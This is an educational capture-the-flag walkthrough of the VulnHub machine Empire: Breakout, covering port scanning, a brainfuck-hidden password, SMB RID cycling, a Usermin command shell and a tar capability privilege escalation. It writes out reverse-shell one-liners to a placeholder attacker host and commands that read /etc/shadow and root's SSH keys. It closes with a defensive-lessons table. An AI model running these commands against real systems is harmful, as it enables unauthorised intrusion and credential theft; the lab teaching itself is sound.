# Machine 8 — Empire: Breakout

> **Position:** 8 of 13 · **Band 3 — Easy** (global rank **028** of 708)
> **Full writeup:** [`labs/3-028-empire-breakout/README.md`](../../labs/3-028-empire-breakout/README.md)

| | |
| --- | --- |
| **Machine** | Empire: Breakout |
| **Author** | icex64 & Empire Cybersecurity |
| **Released** | 21 October 2021 |
| **Target OS** | Debian 11 — Apache 2.4.51, Samba 4.6.2, **Webmin 1.981 (:10000)**, **Usermin 1.830 (:20000)** |
| **VulnHub** | [entry/empire-breakout,751](https://vulnhub.com/entry/empire-breakout,751/) |
| **Flags** | 2 — `/home/cyber/user.txt`, `/root/rOOt.txt` |
| **Estimated time** | 4–5 hours |

- ⚠️ **Verification note — machine identity.** Every source fetched for this card confirms the values
  above: Security Akademeia quotes the VulnHub listing (released **21 October 2021**, `02-Breakout.zip`)
  and 0bfxgh0st's screenshots show Oct 2021 file timestamps. All five writeups document user **`cyber`**,
  the brainfuck comment and a *capability* on `/home/cyber/tar`. None of them mentions a 2018 release, a
  `c0mput3r` account, a SUID `customBackup` script or a `kalamid` file — if you meet those details in
  another summary they belong to a **different** machine (a search for them alongside this box found
  nothing), so do not expect them on this VM.

---

## How to use this card

Same template: **A** (method + theory) · **B** (the machine) · **C** (every command, logically).
The new theory here: **why `-p-` + `-sV` is non-negotiable**, **Webmin vs Usermin**, **brainfuck** (a
language, not an encoding), **SMB null session + RID cycling**, and **file capabilities** as a
different — and finer — privilege model than SUID.

---

# Part A — The method (theory)

## A.1 Why `-p-` (together with `-sV`) is non-negotiable

Everything interesting on this box sits on two high ports — **10000** and **20000** (the secret on 80,
the usernames on 139/445). Full-port scanning with version detection is a habit, not an optimisation:
it costs a few minutes, and a missed port costs the engagement.

> ⚠️ **Verification note — what a default scan really shows here.** An earlier version of this card
> claimed a default top-1,000 scan sees only 80/139/445. Checked against nmap's own `nmap-services`
> frequency table — **port 10000 ranks ≈31st and port 20000 ≈541st** of 65,535, both inside the default
> set — and against the full lab writeup, which agrees: a plain `nmap TARGET` *does* list both. What a
> bare, versionless scan still hides is **what they are** — they appear as anonymous `http` until you
> add `-sV`. And in the real world the interesting consoles sit on 8443, 9090, 10443, 3000, 15672 —
> ports the top-1,000 genuinely misses. So scan all 65,535 ports anyway: **a false negative is worse
> than a slow scan.**

**Beginner trap:** "the scan found nothing" almost always means "I did not ask what the ports run."

## A.2 Webmin vs Usermin — same family, different audience

| | **Webmin** | **Usermin** |
| --- | --- | --- |
| Manages | **the system** | **the individual user** |
| Expects | an **administrator** account | an **ordinary** account |
| Here | port **10000** (1.981) | port **20000** (1.830) |

**MiniServ** is Webmin's own Perl HTTP daemon — and note the trap: nmap banners **both** ports
`MiniServ … (Webmin httpd)`, because Usermin reuses it. The *login page title* tells the truth:
Security Akademeia's screenshots show **"Login to Webmin"** on 10000, **"Login to Usermin"** on 20000.
That is why the ordinary account `cyber` **fails** on 10000 and **succeeds** on 20000. **Knowing which
product is on which port tells you which credentials belong there.**

## A.3 Brainfuck: a language, not an encoding

A string made almost only of `> < + - . , [ ]` is **brainfuck**, a **Turing-complete** language with
eight instructions operating on a tape of byte cells:

| `>` `<` | move the pointer right / left |
| `+` `-` | increment / decrement the current cell |
| `.` `,` | output the cell as a byte / read one byte |
| `[` `]` | jump forward if the cell is 0 / back if non-zero |

It is a **program**, so you **run** it, not "decode" it. It looks impenetrable and solves in under a
second. **Recognise the character set first:** only `+ - < > . , [ ]` → brainfuck; `A–Z 2–7` + `=` →
base32; `A–Z a–z 0–9 + /` + `=` → base64; even `0–9a-f` → hex. The writeups identified it with online
analysers — [dcode.fr's cipher identifier](https://www.dcode.fr/cipher-identifier),
[decode.fr](https://www.dcode.fr/brainfuck-language) and [splitbrain.org's Ook! decoder](https://www.splitbrain.org/services/ook)
— fine for this public comment; **for anything sensitive, run an interpreter locally** (Step 2 ships one).

## A.4 SMB null session and RID cycling

Samba identifies each account by a **SID** like `S-1-22-1-1000`, where the trailing number is the
**RID**. The `S-1-22-1` domain is how Samba maps **Unix accounts** into Windows-style SIDs: root gets
RID **0**, the first ordinary human account RID **1000**. If SMB allows a **null session** (empty
credentials), you can ask *"who is RID 1000? 1001?"* and get **usernames back** — **no password, no
exploit, just a misconfigured permission.** enum4linux's default probe range is `500-550,1000-1050`,
which is exactly why it lands on RID 1000; a manual loop (Step 3) also shows Debian's system accounts
(`root` RID 0, `backup` RID 34, …) that no human logs into.

## A.5 Capabilities: a finer privilege model than SUID

**SUID root** grants **everything root can do**. A **capability** grants **one specific** kernel
permission. `cap_dac_read_search` bypasses **file-read and directory-search** checks (the "discretionary
access control" part). It does not let you write or execute — but it lets you **read anything**,
including `/etc/shadow`, root's keys, or a backup containing a password. The `=ep` suffix is libcap's
flag notation: **`p`** = permitted (the process may hold the right from exec) and **`e`** = effective
(the kernel enforces it right now).

> **Never scan only for SUID.** `getcap -r /` belongs on your checklist beside `find -perm -4000`.

## A.6 Why `tar` takes **two** steps

`tar` cannot `cat` — it can only **archive** and **extract**. But extraction **changes the owner**:
`tar` strips the leading `/`, so the file is recreated **relative to your current directory** and owned
by **you** — as a non-root user you could not chown anyway, and GNU tar quietly assigns your own uid
instead (root, by contrast, gets `--same-owner` behaviour by default). The capability let tar **read**
it; the extraction gave you a **readable copy**. That is why two steps, not one.

---

# Part B — The machine

## B.1 What you will learn

1. Scan **all 65,535 ports with version detection** and recognise `MiniServ` → Webmin/Usermin.
2. Distinguish **Webmin** from **Usermin** — even when nmap banners them identically.
3. Decode **brainfuck** locally.
4. Enumerate SMB users with **`enum4linux`** and understand **RID cycling**.
5. Get a command channel from a **web admin console** — and why that is **not** a real shell.
6. Use **`getcap -r /`** and interpret `cap_dac_read_search=ep`.
7. Use **`tar`** to bypass a DAC read restriction, and why extraction changes the owner.
8. Recognise the "**plaintext password in a backup directory**" pattern.

## B.2 The map

| Stage | Where |
| --- | --- |
| High-numbered management ports | **10000** (Webmin), **20000** (Usermin) |
| Obfuscation as fake protection | brainfuck in an HTML comment on the default page |
| **SMB null + RID cycling** | 139/445 → user **`cyber`** |
| Exposed consoles | Webmin **and** Usermin reachable from the network |
| Console → command channel | **Usermin Command Shell** as `cyber` |
| **Capability** | `/home/cyber/tar` with `cap_dac_read_search=ep` |
| Plaintext secret in a backup | `/var/backups/.old_pass.bak` |

## B.3 Before you start

- [01 — Foundations](../01-Foundations-Networking-and-Recon.md) §6–§7 (full-port scanning, what `-sC` adds).
- [03 — Service and Network Attacks](../03-Service-and-Network-Attacks.md) **§2** (SMB, null sessions, RID cycling).
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§3** (capabilities) — the whole escalation.

**Answer before:**
1. Your bare scan lists 80, 139, 445, 10000, 20000 — but no versions. What do you add, and why does it
   matter? What would you have missed if the consoles were on 8443 or 9090?
2. What is **RID cycling**, and what SMB setting must be true for it to work?
3. Is a shell from a web admin console the same as SSH? Name two differences.
4. What does `cap_dac_read_search` allow that ordinary Unix permissions forbid?
5. When you `tar` a root-owned file and extract it as yourself, who owns the copy? Why?

---

# Part C — The walkthrough, step by step

## Step 1 — Scan

```bash
sudo nmap -sC -sV -p- -T4 -oN scans/breakout.txt TARGET
```

- `-p-` → all **65,535** TCP ports · `-sV` → fingerprint versions by banner/probe ·
  `-sC` → safe **default scripts** (adds `http-title`, `nbstat`, `smb2-security-mode`, …) ·
  `-T4` → aggressive-but-sane timing (`-T5` abandons slow replies → false negatives) ·
  `-oN` → save a human-readable report · `sudo` → enables the faster SYN scan.

```text
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
```

**How to read it.** First the line everyone skips: `65535 − 65530 = 5` interesting ports, and `(reset)`
means the host is **up and answering** — not firewalled. Then four services: `MiniServ` is Webmin's own
HTTP server, so 10000 and 20000 are **two management consoles** — and **two different versions**
(`1.981` vs `1.830`), the hint that they are two different products (A.2). Samba on 139 *and* 445 means
NetBIOS-over-TCP plus direct SMB; the `-sC` script also reports `Message signing enabled but not
required` — a hardening gap worth noting for Part D. **There is no SSH at all**, so any shell must come
from the web consoles.

## Step 2 — Page source → brainfuck

The default page renders nothing useful — **view source** and scroll to the bottom, where an HTML
comment `<!-- … -->` hides hundreds of characters drawn only from `+ - < > . , [ ]`:

```bash
curl -s http://TARGET/ | tail -25
curl -s http://TARGET/ | grep -oE '[-+<>.,\[\]]{50,}' > program.txt
```

```html
<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
-->
```

**How to read it.** `tail -25` because the comment sits at the page's end (the author's "It's encrypted"
is a joke — anything in HTML is **public**: comments are simply not rendered). `grep -oE … > program.txt`
saves only the matching runs: `-o` prints matches alone, `-E` enables extended regex, `{50,}` demands 50+
characters so stray punctuation does not match. This is a **program**, so run it (A.3) — there is no
interpreter preinstalled, so write a tiny one (it is also the fastest way to *feel* what
"Turing-complete on a tape of cells" means):

```bash
cat > bf.py <<'EOF'
import sys
prog = [c for c in open(sys.argv[1]).read() if c in '+-<>.,[]']
tape, ptr, ip, out, stack = [0] * 30000, 0, 0, [], []
jump = {}
for i, c in enumerate(prog):                 # pass 1: match every [ with its ]
    if c == '[': stack.append(i)
    elif c == ']': j = stack.pop(); jump[i], jump[j] = j, i
while ip < len(prog):                        # pass 2: one instruction per step
    c = prog[ip]
    if c == '>': ptr += 1
    elif c == '<': ptr -= 1
    elif c == '+': tape[ptr] = (tape[ptr] + 1) % 256
    elif c == '-': tape[ptr] = (tape[ptr] - 1) % 256
    elif c == '.': out.append(chr(tape[ptr]))          # ',' unused: this program reads no input
    elif c == '[' and not tape[ptr]: ip = jump[ip]     # at 0, skip forward past the ]
    elif c == ']' and tape[ptr]: ip = jump[ip]         # non-zero, jump back to the [
    ip += 1
print(''.join(out))
EOF
python3 bf.py program.txt
```

```text
.2uqPEfj3D<P'a-3
```

**How to read it.** 16 characters, mixed case with digits and symbols: **a password.** The 30,000-cell
tape, the pointer and the two-pass jump table are the whole language. **Run it locally** — never paste
client data into a third-party interpreter.

## Step 3 — SMB: anonymous access and RID cycling

```bash
enum4linux -a TARGET
```

`-a` means "do everything": shares, policy, groups, and the RID walk (A.4). What matters:

```text
[+] Server TARGET allows sessions using username '', password ''
...
//TARGET/print$    Mapping: DENIED, Listing: N/A
...
RID Range ........ 500-550,1000-1050
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\cyber (Local User)
```

**How to read it — three separate results.** The **null session is allowed** (`username '', password ''`
is SMB-speak for empty credentials). **Both shares are `DENIED`** — anonymous *file* access is closed,
correctly a dead end. **But the SID lookup succeeded**: an anonymous session may still resolve SIDs to
names, and RID 1000 is the first real account → **`cyber`**, which with the brainfuck password gives you
a credential pair. Alternatives: `rpcclient -U "" -N TARGET` (`lookupsids S-1-22-1-1000`),
`smbclient -L TARGET -N` (lists `print$` and `IPC$`, mapping still denied), or
`crackmapexec smb TARGET --rid-brute 2000`.

## Step 4 — Which console takes the credential

Theory first (A.2): try the pair on **both** consoles. The browser route is easiest — visit
`http://TARGET:10000/` and you get a document error / redirect to **https** (accept the self-signed
warning in a lab), then log in. The scriptable route:

```bash
curl -sk "https://TARGET:10000/session_login.cgi" -d "user=cyber&pass=.2uqPEfj3D<P'a-3" -o /dev/null -w 'webmin 10000: %{http_code} %{redirect_url}\n'
curl -sk "https://TARGET:20000/session_login.cgi" -d "user=cyber&pass=.2uqPEfj3D<P'a-3" -o /dev/null -w 'usermin 20000: %{http_code} %{redirect_url}\n'
```

**How to read it.** `-s` silent, `-k` accept the self-signed certificate, `-d` the POST body (quote it —
the password contains `'` and `<`), `-o /dev/null` throws the body away, `-w` prints the status code
plus **where the login landed you**: a bounce back to the login page means failure, a redirect into the
console means a session was set. The ground truth is visual — Security Akademeia and CyberArri both
show **Webmin :10000 rejecting `cyber`, Usermin :20000 accepting it** — exactly right: **Webmin manages
the system** (so it expects an administrator), **Usermin serves individual users** (so an ordinary
account works).

## Step 5 — Foothold: the Usermin Command Shell

Log in on `https://TARGET:20000/` and find **Commands → Command Shell** (bottom left as a `>_` icon —
easy to miss; in some skins it is behind the hamburger menu). It runs OS commands in the browser:

| Command | Output |
| --- | --- |
| `id` | `uid=1000(cyber) gid=1000(cyber) groups=1000(cyber),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)` |
| `ls -la` | `tar  user.txt  .bashrc  .profile  .tmp` |
| `cat user.txt` | **flag 1 of 2** (`/home/cyber/user.txt`) |
| `sudo -l` | `bash: sudo: command not found` |

**How to read it.** `id`: uid/gid 1000 is an ordinary account, and that long `groups=` list is all
hardware-ish groups — nothing privileged, no `sudo`/`wheel`. Three facts drive the rest: **`sudo` is
not installed** (the whole "sudo misconfiguration" privesc family is off the table), the **user flag is
already in reach**, and **a `tar` sits in a user's home** — a 531 KB executable in `~` is anomalous. Hold
that.

## Step 6 — Get a real shell

A browser command box gives no TTY, no job control, no tab completion — and Security Akademeia reports
`su` failing there with `Authentication failure`. **Check what the target has before choosing a
payload:**

```bash
which bash sh python3 perl nc curl wget gcc
```

```text
/bin/bash /bin/sh /usr/bin/python3 /usr/bin/perl /usr/bin/curl /usr/bin/wget /usr/bin/gcc
```

**How to read it.** `which` prints where each command lives; anything absent from the output is absent
on the target — run it on **your** VM, this table is only an example. There is **no `nc`** above, so use
bash's own TCP support. (CyberArri's writeup drove `nc <kali> 4444 -e /bin/bash` from the web box
successfully, so some images *do* ship it — your `which` output is the authority.) On Kali **first**,
open the listener:

```bash
nc -lvnp 4444
```

`-l` listen · `-v` report the connection · `-n` skip DNS · `-p` port. **Listener before payload** — a
reverse shell fired into a dead port just dies. Then, in the Usermin box:

```bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
```

**How to read it, piece by piece.** `bash -i` = interactive shell; `/dev/tcp/HOST/PORT` is a **bash-only
pseudo-path** — opening it makes bash open that TCP connection (plain POSIX `sh`, e.g. Debian's dash, does
*not* have it, though Ra-Sec's writeup shows `sh -i >& /dev/tcp/…` working too — prefer `bash` to be
safe); `>&` duplicates stdout (and stderr) onto the socket; `0>&1` duplicates stdin from the same socket,
so input, output and errors all travel over one connection. You should see:

```text
connect to [ATTACKER] from (UNKNOWN) [TARGET] 49224
bash: cannot set terminal process group (4404): Inappropriate ioctl for device
bash: no job control in this shell
cyber@breakout:~$
```

The two `bash:` warnings are **expected** — they are the missing TTY announcing itself. Fix it now:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z ; on Kali:
stty raw -echo; fg
export TERM=xterm; stty rows 40 cols 160
```

**Line by line:** `pty.spawn` gives the target shell a pseudo-terminal (prompts, tab completion);
`Ctrl+Z` suspends the connection back to *your* Kali shell; `stty raw -echo` stops Kali from
double-processing keystrokes and `fg` resumes the target shell into the foreground; `TERM` plus the
dimensions fix colour and line-wrapping. Ra-Sec's variant appends `reset` after `fg` — equally fine.
Without this upgrade, passwords and `vim` misbehave in confusing ways.

## Step 7 — The escalation is **not** SUID

```bash
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

**How to read the commands.** `find /` walks the whole filesystem, `-perm -4000` matches files with the
**SUID bit** (run as the file's owner — usually root), `-type f` skips directories, `2>/dev/null` hides
the flood of "permission denied" errors from root-only folders. `getcap -r /` is the same sweep for
**capabilities** — it prints file names plus flags like `=ep` (A.5):

```text
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
... (all stock)
```
```text
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```

All the SUID entries are **stock** (the default Debian set, carefully written and not exploitable here)
— when the SUID list is boring, move to the next vector. `/usr/bin/ping cap_net_raw` is **normal** (raw
sockets legitimately need privilege). **`cap_dac_read_search`** is the one that matters (A.5). Now look
closely at the binary:

```bash
ls -l /home/cyber/tar && getcap /home/cyber/tar
md5sum /home/cyber/tar; md5sum /bin/tar
```

```text
-rwxr-xr-x 1 root root 531928 Oct 19 2021 /home/cyber/tar
/home/cyber/tar cap_dac_read_search=ep
2c07f16d9be6d1bef784bd37928f18c1  /home/cyber/tar
2c07f16d9be6d1bef784bd37928f18c1  /bin/tar
```

**Two readings.** First the mode: **`-rwxr-xr-x`, not `-rwsr-xr-x`** — there is no SUID bit, which is
exactly why `find -perm -4000` found nothing. Second the hashes: **byte-identical to the distro's
`/bin/tar`** (Security Akademeia) — the binary is innocent; the *capability metadata* is the entire
vulnerability. Root-owned, world-executable file + one narrow right = a **root-powered file reader** for
anyone who runs it.

## Step 8 — Exfiltrate the password — the two-step

```bash
ls -la /var/backups/
cat /var/backups/.old_pass.bak
```

```text
-rw------- 1 root root 17 Oct 20  2021 .old_pass.bak
cat: /var/backups/.old_pass.bak: Permission denied
```

**How to read it.** Three traps in one listing: it is a **dot-file** (a bare `ls` hides it — hence
`-la`), it is mode **600 owned by root** (so `cat` fails the DAC read check — the kernel compares *your*
uid against the mode), and it sits in a **backups** directory with a password-shaped name. Backups
concentrate old secrets — always look there first. It is 17 bytes: a 16-character password plus a
newline. `tar` cannot `cat`, so use **both halves**:

```bash
./tar -cf backup.tar /var/backups/.old_pass.bak
./tar -xf backup.tar
cat var/backups/.old_pass.bak
```

```text
./tar: Removing leading '/' from member names
```
```text
Ts&4&YurgtRX(=~h
```

**How to read it.** Note the `./` — a bare `tar` would run **the system `/bin/tar` without the
capability** and hit the same Permission denied. `-c` creates an archive, `-f` names it: the capability
lets `./tar` **read** the root-only source file. **The warning is the mechanism:** GNU tar strips the
leading `/`, so the stored path is *relative* — `var/backups/.old_pass.bak` — and extraction recreates it
**inside your current directory**, owned by **you** (A.6). Now `cat` works because the copy passes the
DAC check.

```bash
su root
id
cat /root/rOOt.txt
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

**How to read it.** `su` substitutes your user; it prompts for root's password **without echoing it**
(nothing appears as you type — that is normal; special characters like `& ( = ~` are typed verbatim at a
password prompt — they only matter inside shell command lines). Two traps: the prompt may **not visibly
change** after success — run `id` to confirm (Security Akademeia); and if you are still inside the
Usermin browser box you get `Authentication failure` instead — redo Step 6. The flag file is `rOOt.txt` —
**capitalisation matters on Linux**: Security Akademeia's `cat r00t.txt` returned `No such file or
directory`, so `ls -la` before assuming a name.

## Step 9 — What else the capability could do

You are root by now, so plain `cat` would work — the point is that **before** you ever typed `su`, the
same two commands already exposed every root-readable file:

```bash
./tar -cf shadow.tar /etc/shadow && ./tar -xf shadow.tar && cat etc/shadow
./tar -cf rootssh.tar /root/.ssh && ./tar -xf rootssh.tar && ls -la root/.ssh
```

**Why.** Once a capability lets you read anything, **enumerate every credential store — do not stop at
the first flag.** `/etc/shadow` gives root's hash for offline cracking (`$y$` = yescrypt, deliberately
very slow); `/root/.ssh/` may hold `authorized_keys` (who may log in without a password) and, worse, an
unencrypted private key — a **persistent** credential that survives password rotation.

---

# Part D — Defensive lessons

| Finding | Fix |
| --- | --- |
| Brainfuck secret in a public page | Anything in HTML is public. Obfuscation is not confidentiality |
| **SMB null session + RID cycling** | Require SMB signing; restrict anonymous enumeration |
| Webmin and Usermin exposed to the network | **Bind them to localhost or a management VLAN.** Admin consoles must never face the user network |
| Usermin Command Shell enabled | Disable the module — a self-service console should not offer arbitrary command execution |
| Patch drift (Usermin 1.830 vs Webmin 1.981) | Inventory **every** component and version; patch as a family |
| **Root password in `/var/backups/`** | Never store plaintext credentials in backups; a secrets manager with audit logging |
| `cap_dac_read_search` on a user-owned binary | Remove the capability (`setcap -r /home/cyber/tar`); audit `getcap -r /` regularly — most baselines check SUID and forget capabilities |
| No SSH, but two web consoles | Reducing one remote path while opening two others is a net loss. Count your **actual** attack surface |

**The single biggest lesson:** *a narrow privilege can be fatal.* `cap_dac_read_search` cannot execute
and cannot write — it can only read. That was enough to hand over root, because one readable file
contained the password.

---

# Part E — Review questions

1. Which flags turned five anonymous ports into two identifiable consoles? What would a bare
   `nmap TARGET` have shown, and what would it still have hidden?
2. Brainfuck is a **Turing-complete language**, not an encoding. Does that make the secret harder than base64? Explain.
3. Webmin and Usermin are the same family. Why did the **older** one let you in and the newer not?
4. Why is the Usermin Command Shell a poor substitute for a shell? List three limitations.
5. `cap_dac_read_search` is **narrower** than root. Why was it still fatal?
6. When you extracted the archive, why did the owner change to you? Explain `tar` and `--same-owner`.
7. The box has no SSH. Did that make it more or less secure? Argue both sides.

---

# Part F — Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Two things. **First:** scan everything with versions — `sudo nmap -p- -sV TARGET`. On a bare
(versionless) scan 10000 and 20000 look like anonymous `http`; `-sV` reveals `MiniServ`, and `-p-`
guarantees nothing was skipped. **Second:** port 80 serves the stock Apache page — look at the
**source**; something is there that is not English, base64 or hex: almost only `> < + - . [ ]`.
</details>

<details>
<summary><strong>Rung 2 — the encoding and the username</strong></summary>

That character set is **brainfuck** — a language, you **run** it. → `.2uqPEfj3D<P'a-3`. For the
username: `enum4linux -a TARGET` / `crackmapexec smb TARGET --rid-brute 2000` → **`cyber`**.
</details>

<details>
<summary><strong>Rung 3 — which console</strong></summary>

10000 = **Webmin** (root-level), 20000 = **Usermin** (per-user). Try `cyber` + password on **both**:
**Webmin fails, Usermin succeeds**. Find the **Command Shell** → `user.txt` → reverse shell.
</details>

<details>
<summary><strong>Rung 4 — the escalation</strong></summary>

`getcap -r / 2>/dev/null` → **`/home/cyber/tar cap_dac_read_search=ep`**. Use it on the root-only
`/var/backups/.old_pass.bak`: `./tar -cf b.tar /var/backups/.old_pass.bak` → `./tar -xf b.tar` →
`cat var/backups/.old_pass.bak` → root password → `su root`.
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -p- -sV` → **80, 139, 445, 10000, 20000** (no SSH). 2. Page source → brainfuck →
`.2uqPEfj3D<P'a-3`. 3. `enum4linux`/RID → **`cyber`**. 4. **Usermin :20000** accepts `cyber`+pass.
5. Command Shell → `user.txt` → reverse shell. 6. `getcap -r /` → **tar `cap_dac_read_search`**.
7. `tar` archive+extract → root password. 8. `su root` → `/root/rOOt.txt`.
</details>

---

# Part G — References

- **VulnHub entry:** <https://vulnhub.com/entry/empire-breakout,751/>
- **English lab:** [`labs/3-028-empire-breakout/README.md`](../../labs/3-028-empire-breakout/README.md)
- **Greek mirror of this card:** [`Μηχανές/08-empire-breakout.md`](../../Μαθησιακή%20Διαδρομή%201%20-%20Εισαγωγή%20στην%20Κυβερνοασφάλεια/Μηχανές/08-empire-breakout.md)
- **Cross-checked writeups** (confirm 10000/20000, brainfuck, `cyber`, capability tar):
  - [Ra-Sec — Empire Breakout](https://ra2302.github.io/posts/Breakout/)
  - [The Village Hacker — Empire-breakout](https://thevillagehacker-security.gitbook.io/ctf-writeups/2023-10-01-proving_grounds_play-empire-breakout)
  - [Security Akademeia — Empire: Breakout](https://akademeia.info/?p=27242)
  - [HackTricks — Linux Capabilities](https://hacktricks.wiki/en/linux-hardening/interesting-files-permissions/linux-capabilities.html)
    (moved from `book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities`, which now 404s)

- **Community notes — consensus, pitfalls and alternative routes** (cross-checked against the sources below):
  - **Consensus chain:** full `nmap -p-` → `80/139/445/10000/20000` → brainfuck in the Apache page source → `.2uqPEfj3D<P'a-3` → SMB null session + RID cycling → user `cyber` → log in to **Usermin :20000** → Command Shell → `user.txt` → `getcap -r /` → `/home/cyber/tar cap_dac_read_search=ep` → archive+extract `/var/backups/.old_pass.bak` → `su root` → `/root/rOOt.txt`.
  - ⚠️ **Verification note — what the default scan shows.** Older text here claimed a default top-1,000 scan sees only 80/139/445. Checked against nmap's `nmap-services` frequency table (10000 ≈ rank 31, 20000 ≈ rank 541 → both in the default set) and the lab README, which agrees: a plain `nmap` **does** list them. The real pitfalls are scanning **without `-sV`** (both consoles stay anonymous `http`) and assuming the top-1,000 is enough in the wild (8443/9090/10443/3000 live outside it). Keep `-p- -sV` as your default habit.
  - ⚠️ **Verification note — file details.** Three writeups (0bfxgh0st, The Village Hacker, Security Akademeia) show `/var/backups/.old_pass.bak` as **17 bytes, dated 20 Oct 2021** (16-character password + newline) and `/home/cyber/tar` as **531928 bytes, Oct 19 2021** — earlier text in this card said 16 bytes / 19 Oct, now corrected.
  - **Common pitfall:** `cyber` fails on Webmin :10000 but succeeds on Usermin :20000 — test **every** credential against **every** login surface, and read the login page title rather than nmap's identical `MiniServ … (Webmin httpd)` banners.
  - **Common pitfall:** `su root` inside the Usermin Command Shell fails (`Authentication failure`, per Security Akademeia) — get a real reverse shell first (Step 6); The Village Hacker and Security Akademeia both show `su root` working from the plain reverse shell, and upgrading with `python3 pty.spawn` afterwards fixes prompts, tab completion and password entry.
  - **Alternative routes:** `rpcclient -U "" -N` with a `lookupsids S-1-22-1-$i` loop or `crackmapexec smb --rid-brute` instead of `enum4linux` (0bfxgh0st); CyberArri archived the **whole directory** (`cd /tmp && /home/cyber/tar -cvf new.tar /var/backups`) instead of one file; `nc <kali> 4444 -e /bin/bash` from the web box when netcat exists (CyberArri); and once you hold root's password, **Webmin :10000 accepts `root`** — its own Command Shell reads `rOOt.txt` for you (Security Akademeia, step 21).
  - **Also note:** the root flag is `rOOt.txt` with a capital "O" — `ls -la` before assuming `r00t.txt`. The Proving Grounds Play variant of this machine (The Village Hacker) ships `local.txt` instead of `user.txt`; the content chain is otherwise identical.
  - **Verified sources:** [Ra-Sec](https://ra2302.github.io/posts/Breakout/) · [The Village Hacker](https://thevillagehacker-security.gitbook.io/ctf-writeups/2023-10-01-proving_grounds_play-empire-breakout) · [0bfxgh0st](https://0bfxgh0st.github.io/vulnhub/empire-breakout/) · [CyberArri](https://cyberarri.com/2022/07/25/empire-breakout/)

---

# Part H — If you get completely stuck

- Verify connectivity: `ping TARGET`, `ip -br a`.
- **`-p- -sV` first** — a bare scan lists the high ports but hides *what* they are (and `-p-` guarantees
  you never skip a port in the first place).
- If `su` fails or the prompt misbehaves, you are still in the browser box with no TTY — redo Step 6.
- Check [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and [`docs/TOOLS.md`](../../docs/TOOLS.md).
- Revert the snapshot and redo from memory.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 7 — Mr-Robot: 1](07-mr-robot-1.md) · next: [Machine 9 — CengBox: 1](09-cengbox-1.md) · full writeup: [`labs/3-028-empire-breakout`](../../labs/3-028-empire-breakout/README.md)._
